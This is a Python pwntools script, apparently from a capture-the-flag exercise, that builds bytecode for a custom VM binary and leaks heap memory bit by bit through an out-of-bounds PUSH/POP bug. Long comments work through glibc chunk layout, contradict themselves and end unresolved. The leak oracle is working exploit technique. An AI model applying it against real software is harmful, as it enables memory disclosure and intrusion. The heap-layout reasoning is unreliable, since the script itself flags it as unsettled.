#!/usr/bin/env python3
"""
Heap Address Leak

The page structure has a 4-byte header at offset 0. This is the VM address (high 24 bits).
If we could find a page that was freed and reallocated, the freed fd might have a heap pointer.

Actually, let's try a simpler approach:
When a page is first allocated, what's at offset 0x104-0x107?
If it's uninitialized heap data, it might contain interesting pointers.

For a fresh malloc(0x104), the bytes 0x104-0x107 are beyond what was zeroed.
They might contain leftover data from previous allocations!
"""
from pwn import *
import sys

context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def hlt():
    return bytes([0x00])

def trigger_illegal():
    return bytes([0xFF])

def test_bit(code_addr, read_addr, bit_position, expected_bit=1):
    """Test if bit at read_addr equals expected_bit."""
    code = b''
    code += mov_reg_imm(15, read_addr - 4)  # SP so that [SP+4] = read_addr
    code += pop_reg(0)
    
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = code_addr + len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_dword(code_addr, read_addr):
    """Leak a 32-bit value at read_addr using bit-by-bit oracle."""
    val = 0
    for bit in range(32):
        if test_bit(code_addr, read_addr, bit, 1):
            val |= (1 << bit)
    return val

# Allocate a stack page and read the OOB area
# Stack page at 0x20000, OOB at 0x20103 (read_addr with SP+4 = 0x20103 -> SP = 0x200FF)
# But we need the page to exist first, so we need to write something to it

# Let's allocate code at 0x10000, then allocate stack at 0x20000
# The stack page will be the second page allocation (after code page)
# Between code page alloc and stack page alloc, there might be page table allocs too

# The OOB area of the stack page (bytes 0x104-0x107) might contain heap pointers
# from previous allocations in the same tcache bin

print("[*] Leaking OOB bytes from stack page...")

code_addr = 0x10000

# Read from stack page's OOB area
# POP reads from [SP+4]. To read page[0x104], we need SP+4 to resolve to page offset 0x104.
# But offset is only 8 bits. offset = (SP & 0xFF) + 4.
# To get offset 0x104, we need (SP & 0xFF) = 0x100, which wraps to 0x00.
# Then [SP+4] = page[0x04].

# Hmm, to read page[0x104], we need a different approach.
# STORE/LOAD with cross-page handling!

# LOAD instruction: reg = [reg2] where reg2 is the address
# LOAD format: mode 4, opcode 1 -> (4 << 5) | 1 = 0x81

def load_mem_reg(dest_reg, addr_reg):
    """LOAD dest_reg, [addr_reg] - mode 4"""
    return bytes([0x81, dest_reg, addr_reg])

# Let's test reading from an address that would be in the OOB area
# Address 0x20104 = page 0x201, offset 0x04
# This is the NEXT page, not OOB of current page

# To read OOB of page 0x200, we need address 0x20104... which is page 0x201 offset 0x04.
# The paging system treats 0x20104 as a valid address in a different page!

# So we CAN'T directly access page[0x104] via LOAD because the address would be
# interpreted as a different page.

# The only way to access OOB is via PUSH/POP with SP at offset 0xFF.
# PUSH writes at [SP+4] = [0x200FF + 4] = but wait, how does this work?

# Let me re-check: PUSH uses get_page(SP >> 8), then writes at offset (SP & 0xFF) + 4.
# get_page(0x200FF >> 8) = get_page(0x200) = page for VM address 0x200xx
# offset = (0x200FF & 0xFF) + 4 = 0xFF + 4 = 0x103

# So we CAN write at page[0x103] via PUSH. But page[0x103] is offset 0xFF of the data area,
# which is the last byte of the 256-byte data (bytes 4-259 of malloc chunk = 0x04-0x103).

# Hmm wait, let me recalculate.
# malloc(0x104) returns 260 bytes of usable area (or 0x108 = 264 due to alignment).
# page[0x00-0x03] = 4-byte header
# page[0x04-0x103] = 256 bytes data
# page[0x104-0x107] = 4 bytes padding (within usable 0x108)

# PUSH at SP=0x200FF writes at page[0xFF + 4] = page[0x103].
# page[0x103] is the LAST byte of the data area, not OOB.

# To write at page[0x104], we need offset 0xFF + 4 = 0x103... no, that's still 0x103.
# offset + 4 = 0x104 requires offset = 0x100, but offset is (SP & 0xFF) = max 0xFF.

print("[*] Cannot access true OOB (page[0x104+]) via PUSH/POP")
print("[*] The offset wraps at 0xFF, so max write is page[0x103]")
print("[*] And page[0x103] is within the 256-byte data area")

# Wait, I keep confusing myself. Let me be very precise:
# Page structure: 4 bytes header + 256 bytes data = 260 bytes total
# malloc(260) = malloc(0x104)
# Chunk has usable_size 0x108 = 264 bytes.

# page[0] is user_data[0] = header byte 0
# page[3] is user_data[3] = header byte 3
# page[4] is user_data[4] = data byte 0
# page[259] = page[0x103] = user_data[259] = data byte 255 (last data byte)
# page[260] = page[0x104] = user_data[260] = padding byte 0 (within usable)
# page[263] = page[0x107] = user_data[263] = padding byte 3 (last usable byte)
# page[264] = page[0x108] = beyond usable = next chunk's prev_size

# PUSH at SP with low byte 0xFF writes at page[0xFF + 4] = page[0x103] = last data byte.
# That's NOT OOB. The maximum offset is 0xFF, so max write is at 0xFF+4 = 0x103.

# BUT WAIT! The previous test showed we could write 0xCAFEBABE and read it back.
# That means we're writing a DWORD (4 bytes) starting at page[0x103].
# A 4-byte write at page[0x103] writes to:
# - page[0x103] = user_data[259] = last data byte
# - page[0x104] = user_data[260] = padding byte 0
# - page[0x105] = user_data[261] = padding byte 1
# - page[0x106] = user_data[262] = padding byte 2

# So we ARE writing beyond the 256-byte data area into the padding area!
# And we can READ from there too via POP!

# The padding area (0x104-0x107) is within usable_size (0x108).
# But 0x108 and beyond is next chunk territory.

# So the write at 0x103-0x106 is within usable bounds.
# To hit next chunk metadata, we need to write at 0x108.

# UNLESS... what if usable_size is exactly 0x104?
# Let me check: malloc(0x104) might return exactly 0x104 usable if alignment allows.

# Actually for glibc 2.35, malloc aligns to 0x10.
# Request 0x104, actual allocation is 0x110 chunk (including 0x10 header).
# User data is 0x100 bytes = 256 bytes.
# Wait that doesn't match malloc_usable_size returning 0x108.

# Let me test this more carefully.

print("[*] Need to determine exact chunk layout")
